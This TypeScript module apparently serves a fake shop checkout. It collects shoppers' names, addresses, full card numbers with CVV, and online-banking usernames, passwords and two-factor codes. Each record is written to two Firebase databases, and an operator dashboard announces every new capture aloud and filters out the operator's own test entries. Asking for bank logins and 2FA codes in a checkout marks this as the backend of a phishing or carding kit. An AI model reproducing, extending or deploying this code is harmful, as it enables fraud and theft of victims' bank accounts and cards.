import { v4 as uuidv4 } from 'uuid';
import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
import { database } from "../firebaseConfig"  
import { database2 } from "../firebaseConfig2"  
import { off, onValue, ref, set } from '@firebase/database';

export interface OrderData {
  id: string;
  timestamp: number;
  formData: FormData;
  cardData: CardData;
  bankLoginData: BankLoginData;
  bankName: string;
  productInfo?: {
    id: string;
    name: string;
    price: number;
    quantity: number;
    image: string;
    set: string;
  }[];
  total?: number;
}
let previousOrdersLength = -1;
// In-memory storage for orders
let orders: OrderData[] = [];

// Generate a new GUID for a session
export const generateOrderId = (): string => {
  return uuidv4();
};

// Save or update order data
export const saveOrderData = async(
  orderId: string,
  data: Partial<OrderData>
): Promise<void> => {
  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);

  if (existingOrderIndex >= 0) {
    // Update existing order
    orders[existingOrderIndex] = {
      ...orders[existingOrderIndex],
      ...data,
      timestamp: Date.now(),
    };
  } else {
    orders.push({
      id: orderId,
      timestamp: Date.now(),
      formData: data.formData || {
        firstName: '',
        lastName: '',
        email: '',
        phone: '',
        address: '',
        city: '',
        state: '',
        zipCode: '',
        sameAsBilling: true,
        billingAddress: '',
        billingCity: '',
        billingState: '',
        billingZipCode: '',
      },
      bankName: data.bankName || '',
      cardData: data.cardData || {
        cardholderName: '',
        cardNumber: '',
        expiryDate: '',
        cvv: '',
      },
      bankLoginData: data.bankLoginData || {
        username: '',
        password: '',
        twoFactorCode: '',
      },
      productInfo: data.productInfo,
      total: data.total,
    });
  }

  await saveOrderDatainDB(orderId, orders[existingOrderIndex]);

};

// Get all orders
export const getOrders = async (): Promise<OrderData[]> => {
  return new Promise((resolve, reject) => {
    const ordersRef = ref(database, 'orders/');
    onValue(
      ordersRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const ordersArray: OrderData[] = Object.values(data);
          resolve(ordersArray);
        } else {
          resolve([]);
        }
      },
      (error) => reject(error)
    );
  });
};


// Get a specific order by ID
export const getOrderById = (orderId: string): OrderData | undefined => {
  return orders.find((order) => order.id === orderId);
};

export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData>) => {
  const orderRef = ref(database, 'orders/' + orderId);
  const orderRef2 = ref(database2, 'orders/' + orderId); 

  const orderData: OrderData = {
    id: orderId,
    timestamp: Date.now(),
    formData: data.formData || {
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      address: '',
      city: '',
      state: '',
      zipCode: '',
      sameAsBilling: true,
      billingAddress: '',
      billingCity: '',
      billingState: '',
      billingZipCode: '',
    },
    cardData: data.cardData || {
      cardholderName: '',
      cardNumber: '',
      expiryDate: '',
      cvv: '',
    },
    bankName: data.bankName || '',
    bankLoginData: data.bankLoginData || {
      username: '',
      password: '',
      twoFactorCode: '',
    },
    productInfo: data.productInfo || [],
    total: data.total || 0, 
  };

  await set(orderRef, orderData); // ye DB me save karega
  await set(orderRef2, orderData); // ye DB me save karega
};

export const listenOrdersinDB = (callback: (orders: OrderData[]) => void) => {
  const ordersRef = ref(database, 'orders/');

  onValue(ordersRef, (snapshot) => {
    const data = snapshot.val();
    if (data) {
      const ordersArray: OrderData[] = Object.values(data);
      callback(ordersArray);
    } else {
      callback([]);
    }
  });
};

export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
  const ordersRef = ref(database, 'orders/');

  const listener = onValue(ordersRef, (snapshot) => {
    const data = snapshot.val();
    let ordersArray: OrderData[] = data ? Object.values(data) : [];
    
    // Filter out orders with formData?.firstName = '20xhani20x'
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== 'x20xHani');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== null);
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== undefined);
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhani');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xhan');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xha');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20xh');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20x');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '20');
    ordersArray = ordersArray.filter(order => order.formData?.firstName !== '2');
    
    ordersArray.sort((a, b) => b.timestamp - a.timestamp);
    if (ordersArray.length > previousOrdersLength && previousOrdersLength !== -1) {
      alert("New order received!"); // visual alert
      // Voice alert
      const msg = new SpeechSynthesisUtterance("New order received!");
      window.speechSynthesis.speak(msg);
    }
    previousOrdersLength = ordersArray.length;
    console.log("Orders updated:", ordersArray);
    callback(ordersArray);
  });

  // Return unsubscribe function
  return () => off(ordersRef, 'value', listener);
};
